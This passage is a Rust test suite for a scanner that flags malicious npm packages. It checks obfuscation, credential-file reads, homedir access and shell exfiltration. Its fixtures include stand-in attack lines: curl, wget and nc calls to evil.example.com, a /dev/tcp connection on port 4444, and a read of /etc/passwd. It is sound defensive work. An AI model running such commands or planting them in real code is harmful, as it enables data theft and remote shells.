        let d = dir_with(&[("a.js", "eval(atob('Y29uc29sZS5sb2coMSk='));")]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("BLOCK")
                && f.get("message").and_then(|v| v.as_str())
                    == Some("atob()-decoded payload passed to dynamic execution")),
            "expected atob+eval BLOCK finding; got: {:?}",
            f
        );
    }

    // atob() combined with a Function() string-constructor also escalates to BLOCK
    // (the two calls need not be nested — same-file co-occurrence is enough, since
    // the atob rule checks for the presence of either dynamic-execution primitive).
    #[test]
    fn obfuscation_atob_plus_function_ctor_blocks() {
        let d = dir_with(&[(
            "a.js",
            "const payload = atob('cmV0dXJuIDE=');\nconst f = new Function('return 1');",
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("BLOCK")
                && f.get("message").and_then(|v| v.as_str())
                    == Some("atob()-decoded payload passed to dynamic execution")),
            "expected atob+Function-ctor BLOCK finding; got: {:?}",
            f
        );
        // Function-ctor finding itself stays SUSPECT — avoid double-BLOCK for one root cause.
        assert!(
            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
                && f.get("message").and_then(|v| v.as_str())
                    == Some("Function() constructor with string body — dynamic code execution")),
            "expected Function-ctor SUSPECT finding alongside the BLOCK; got: {:?}",
            f
        );
    }

    // FP-CONTROL: a comment mentioning "atob" with no call must not trip the rule
    // (word-boundary + required `(` guards this).
    #[test]
    fn obfuscation_atob_comment_mention_not_flagged() {
        let d = dir_with(&[("a.js", "// this uses atob under the hood elsewhere\nconst x = 1;")]);
        let f = check_obfuscation(d.path());
        assert!(
            !f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("obfuscation")),
            "comment-only atob mention must not be flagged; got: {:?}",
            f
        );
    }

    #[test]
    fn obfuscation_function_ctor_string_body_is_suspect() {
        let d = dir_with(&[("a.js", "const f = new Function('a', 'b', 'return a+b');")]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
                && f.get("message").and_then(|v| v.as_str())
                    == Some("Function() constructor with string body — dynamic code execution")),
            "expected Function-ctor SUSPECT finding; got: {:?}",
            f
        );
    }

    // FP-CONTROL: Function.prototype.bind must NOT trip the Function-ctor rule
    // (no `(` immediately after `Function` followed by a quote).
    #[test]
    fn obfuscation_function_prototype_bind_not_flagged() {
        let d = dir_with(&[(
            "a.js",
            "function wrap(fn) { return Function.prototype.bind.call(fn, null); }",
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            !f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
                == Some("Function() constructor with string body — dynamic code execution")),
            "Function.prototype.bind must not trip the Function-ctor rule; got: {:?}",
            f
        );
    }

    // ── Hex-identifier density (v18) ───────────────────────────────────────────
    // Closes the javascript-obfuscator gap that let ansi-styles@6.2.2 — a real
    // Sept-2025 crypto clipper — pass all four layers.

    /// Build a body with `n` distinct `_0x…` identifiers, shaped like real
    /// obfuscator output (no eval/atob/Buffer.from anywhere — that is precisely
    /// why the existing rules missed the real sample).
    fn hex_ident_body(n: usize) -> String {
        let mut s = String::from("function _0xdeadbe(){\n");
        for i in 0..n {
            s.push_str(&format!("  var _0x{:06x} = {}[{}];\n", i * 0x2b + 0x1000, "_0xabc123", i));
        }
        s.push_str("}\n");
        s
    }

    #[test]
    fn hex_identifier_density_blocks() {
        let d = dir_with(&[("index.js", &hex_ident_body(HEX_IDENT_BLOCK + 10))]);
        let f = check_obfuscation(d.path());
        let hit = f
            .iter()
            .find(|x| {
                x.get("message")
                    .and_then(|v| v.as_str())
                    .is_some_and(|m| m.starts_with("Hex-identifier obfuscation"))
            })
            .unwrap_or_else(|| panic!("expected a hex-identifier BLOCK; got: {f:?}"));
        assert_eq!(hit.get("severity").and_then(|v| v.as_str()), Some("BLOCK"));
        assert_eq!(hit.get("vector").and_then(|v| v.as_str()), Some("B2"));
    }

    #[test]
    fn hex_identifier_middle_band_is_suspect() {
        let d = dir_with(&[("index.js", &hex_ident_body(HEX_IDENT_SUSPECT + 1))]);
        let f = check_obfuscation(d.path());
        let hit = f
            .iter()
            .find(|x| {
                x.get("message")
                    .and_then(|v| v.as_str())
                    .is_some_and(|m| m.starts_with("Hex-identifier naming"))
            })
            .unwrap_or_else(|| panic!("expected a hex-identifier SUSPECT; got: {f:?}"));
        assert_eq!(hit.get("severity").and_then(|v| v.as_str()), Some("SUSPECT"));
    }

    /// FP-CONTROL: a couple of hand-written hex-ish names must not trip it.
    #[test]
    fn a_few_hex_identifiers_are_not_flagged() {
        let d = dir_with(&[(
            "mask.js",
            "const _0xFFFF0000 = 0xffff0000;\nconst _0x0000FFFF = 0x0000ffff;\n\
             module.exports = (v) => (v & _0xFFFF0000) | (v & _0x0000FFFF);",
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            f.is_empty(),
            "two hand-written mask constants are not obfuscation; got: {f:?}"
        );
    }

    /// FP-CONTROL: ordinary minified output. terser/uglify emit short names
    /// (`a`, `_t`, `n`) and plenty of hex literals — never `_0x` identifiers.
    /// Measured: `d3` ships 174 hex literals and zero `_0x` names, which is why
    /// the rule counts identifiers rather than literals.
    #[test]
    fn terser_style_minified_code_is_not_flagged() {
        let mut body = String::from("!function(a,b){var n=0x1f,t=0xff,e=0x2a;");
        for i in 0..200 {
            body.push_str(&format!("var _v{i}=0x{i:x};"));
        }
        body.push_str("}(window,document);");
        let d = dir_with(&[("bundle.min.js", &body)]);
        let f = check_obfuscation(d.path());
        assert!(
            f.is_empty(),
            "minified code with many hex LITERALS but no `_0x` identifiers must \
             stay clean; got: {f:?}"
        );
    }

    #[test]
    fn suspicious_strings_etc_passwd_blocks() {
        let d = dir_with(&[("a.js", "fs.readFileSync('/etc/passwd');")]);
        let f = check_suspicious_strings(d.path());
        assert!(sevs(&f).contains(&"BLOCK".to_string()));
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    /// Since v19 `process.env` is a CAPABILITY — the other inverted rule, and the
    /// single largest false-positive source in the tool: 36.3% of real malware
    /// carries it versus 44.4% of legitimate packages (lift 0.82), reaching 12 of
    /// the 27 benign parents. Reading configuration is not an attack.
    #[test]
    fn suspicious_strings_env_is_a_capability_not_an_accusation() {
        let d = dir_with(&[("a.js", "const t = process.env.TOKEN;")]);
        let f = check_suspicious_strings(d.path());
        assert_eq!(sevs(&f), vec!["INFO"], "got: {f:?}");
        assert_eq!(
            f[0].get(crate::models::CAPABILITY_KEY).and_then(|v| v.as_str()),
            Some("env-read")
        );
    }

    /// The contrast that justifies keeping the rest of the check: `os.homedir()`
    /// is 14.4% malicious versus 0.0% benign. Same check, opposite evidence.
    ///
    /// The indirect form matters. `naniod` — a real `nanoid` typosquat — reads
    /// `require('os').homedir()` and nothing else detectable; the bare-form
    /// pattern missed it entirely, so it was the one arm E package the v19
    /// capability demotions would otherwise have lost.
    #[test]
    fn suspicious_strings_homedir_still_accuses() {
        for src in [
            "const h = os.homedir();",
            "root: require('os').homedir(),",
            "require(\"os\").homedir()",
            "require( 'os' ) . homedir()",
        ] {
            let d = dir_with(&[("a.js", src)]);
            let f = check_suspicious_strings(d.path());
            assert_eq!(sevs(&f), vec!["SUSPECT"], "{src}");
        }
    }

    /// FP-CONTROL for the widened pattern: other `os` members must not match.
    #[test]
    fn suspicious_strings_other_os_calls_are_not_homedir() {
        let d = dir_with(&[("a.js", "const p = require('os').platform(); os.tmpdir();")]);
        assert!(check_suspicious_strings(d.path()).is_empty());
    }

    #[test]
    fn network_imports_cjs_and_esm() {
        let d = dir_with(&[
            ("a.js", "const ax = require('axios');"),
            ("b.mjs", "import axios from 'axios';"),
        ]);
        let f = check_network_imports(d.path());
        assert_eq!(f.len(), 1);
        let files = f[0].get("files").unwrap().as_array().unwrap();
        assert_eq!(files.len(), 2);
        assert_eq!(f[0].get("vector").and_then(|v| v.as_str()), Some("B2"));
    }

    #[test]
    fn network_imports_clean() {
        let d = dir_with(&[("a.js", "const path = require('path');")]);
        assert!(check_network_imports(d.path()).is_empty());
    }

    // 3b: broadened module set — ws and undici must be detected.
    #[test]
    fn network_imports_ws_and_undici_detected() {
        let d = dir_with(&[
            ("a.js", "const WebSocket = require('ws');"),
            ("b.js", "const { request } = require('undici');"),
        ]);
        let f = check_network_imports(d.path());
        assert_eq!(checks(&f), vec!["network_imports"]);
        let files = f[0].get("files").unwrap().as_array().unwrap();
        assert_eq!(files.len(), 2);
    }

    // 3b: child_process spawning curl is a shell-exfil vector distinct from a
    // JS-level network import.
    #[test]
    fn shell_exfil_curl_spawn_detected() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('curl https://evil.example.com/x');",
        )]);
        let f = check_network_imports(d.path());
        assert!(checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
        assert!(f
            .iter()
            .find(|f| f.get("check").and_then(|v| v.as_str()) == Some("shell_exfil"))
            .map(|f| f.get("vector").and_then(|v| v.as_str()) == Some("B2"))
            .unwrap_or(false));
    }

    // 3b negative control: child_process alone (no curl/wget/nc) must not trip shell_exfil.
    #[test]
    fn shell_exfil_negative_control() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('ls -la');",
        )]);
        let f = check_network_imports(d.path());
        assert!(!checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
    }

    /// Since v19 `dynamic_require` is a CAPABILITY. It is one of only two rules
    /// measured as *inverted*: 7.6% of 499 real malicious packages carry it
    /// versus 14.8% of 27 legitimate ones (lift 0.51). A bundler emits
    /// `require(variable)` by construction, so on its own it is evidence of
    /// nothing.
    #[test]
    fn dynamic_require_is_a_capability_not_an_accusation() {
        for src in ["const m = require(name);", "require(a + b);"] {
            let d = dir_with(&[("a.js", src)]);
            let f = check_dynamic_require(d.path());
            assert_eq!(sevs(&f), vec!["INFO"], "{src}");
            assert_eq!(
                f[0].get(crate::models::CAPABILITY_KEY).and_then(|v| v.as_str()),
                Some("dynamic-require")
            );
        }
    }

    #[test]
    fn dynamic_require_negative() {
        let d = dir_with(&[("a.js", "require('fs');\nrequire();\nconst p = require('path');")]);
        assert!(check_dynamic_require(d.path()).is_empty());
    }

    // --- check_computed_load: computed dynamic import() ---

    #[test]
    fn computed_load_dynamic_import_variable_is_suspect() {
        let d = dir_with(&[("a.js", "const mod = await import(modName);")]);
        let f = check_computed_load(d.path());
        assert!(
            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("computed_load")
                && f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
                && f.get("message").and_then(|v| v.as_str())
                    == Some("Computed dynamic import() — module path built at runtime")),
            "expected computed import() finding; got: {:?}",
            f
        );
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    #[test]
    fn computed_load_dynamic_import_concat_is_suspect() {
        let d = dir_with(&[("a.js", "const mod = await import('./' + name + '.js');")]);
        let f = check_computed_load(d.path());
        assert!(
            checks(&f).contains(&"computed_load".to_string()),
            "expected computed_load finding for concatenated import(); got: {:?}",
            f
        );
    }

    #[test]
    fn computed_load_static_import_not_flagged() {
        let d = dir_with(&[("a.js", "const mod = await import('./fixed-module.js');")]);
        let f = check_computed_load(d.path());
        assert!(
            !f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
                == Some("Computed dynamic import() — module path built at runtime")),
            "static import() literal must not be flagged; got: {:?}",
            f
        );
    }

    // --- check_computed_load: split-string obfuscation ---

    #[test]
    fn computed_load_split_string_systematic_is_suspect() {
        // Non-overlapping alpha-only fragment pairs — regex matches are
        // non-overlapping, so each `+` pair must be its own match to count
        // toward the 3-occurrence threshold.
        let d = dir_with(&[(
            "a.js",
            "const a = 'ab' + 'cd'; const b = 'ef' + 'gh'; const c = 'ij' + 'kl';",
        )]);
        let f = check_computed_load(d.path());
        assert!(
            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("computed_load")
                && f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
                && f.get("message")
                    .and_then(|v| v.as_str())
                    .map(|m| m.starts_with("Systematic split-string obfuscation"))
                    .unwrap_or(false)),
            "expected split-string finding; got: {:?}",
            f
        );
    }

    // FP-CONTROL: a single short-string concatenation is common in legit code and
    // must NOT be flagged (only 3+ occurrences trip the rule).
    #[test]
    fn computed_load_split_string_single_occurrence_not_flagged() {
        let d = dir_with(&[("a.js", "const label = 'a' + 'b';")]);
        let f = check_computed_load(d.path());
        assert!(
            !f.iter().any(|f| f
                .get("message")
                .and_then(|v| v.as_str())
                .map(|m| m.starts_with("Systematic split-string obfuscation"))
                .unwrap_or(false)),
            "single split-string concat must not be flagged; got: {:?}",
            f
        );
    }

    // --- check_network_imports: expanded shell_exfil binary/technique set ---

    #[test]
    fn shell_exfil_python_spawn_detected() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('python3 -c \"import os\"');",
        )]);
        let f = check_network_imports(d.path());
        assert!(checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
    }

    #[test]
    fn shell_exfil_dev_tcp_detected() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('exec 3<>/dev/tcp/evil.example.com/4444');",
        )]);
        let f = check_network_imports(d.path());
        assert!(checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
    }

    #[test]
    fn shell_exfil_curl_wget_nc_still_detected() {
        for bin in ["curl https://evil.example.com", "wget https://evil.example.com", "nc evil.example.com 4444"] {
            let d = dir_with(&[(
                "a.js",
                &format!("const {{ exec }} = require('child_process'); exec('{}');", bin),
            )]);
            let f = check_network_imports(d.path());
            assert!(
                checks(&f).contains(&"shell_exfil".to_string()),
                "expected shell_exfil for {}; got: {:?}",
                bin,
                f
            );
        }
    }

    // Negative control retained: child_process + a harmless binary (ls) must not trip.
    #[test]
    fn shell_exfil_expanded_negative_control() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('ls -la');",
        )]);
        let f = check_network_imports(d.path());
        assert!(!checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
    }

    // --- check_capability_notes: INFO-severity capability notes ---

    #[test]
    fn capability_notes_worker_threads_is_info() {
        let d = dir_with(&[("a.js", "const { Worker } = require('worker_threads');")]);
        let f = check_capability_notes(d.path());
        assert!(
            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("worker_threads")
                && f.get("severity").and_then(|v| v.as_str()) == Some("INFO")),
            "expected worker_threads INFO finding; got: {:?}",
            f
        );
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    #[test]
    fn capability_notes_wasm_reference_is_info() {
        let d = dir_with(&[("a.js", "const bytes = fs.readFileSync('./module.wasm');")]);
        let f = check_capability_notes(d.path());
        assert!(
            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("wasm_reference")
                && f.get("severity").and_then(|v| v.as_str()) == Some("INFO")),
            "expected wasm_reference INFO finding; got: {:?}",
            f
        );
    }

    #[test]
    fn capability_notes_clean_file_not_flagged() {
        let d = dir_with(&[("a.js", "const path = require('path');\nmodule.exports = { add: (a, b) => a + b };")]);
        assert!(check_capability_notes(d.path()).is_empty());
    }
}
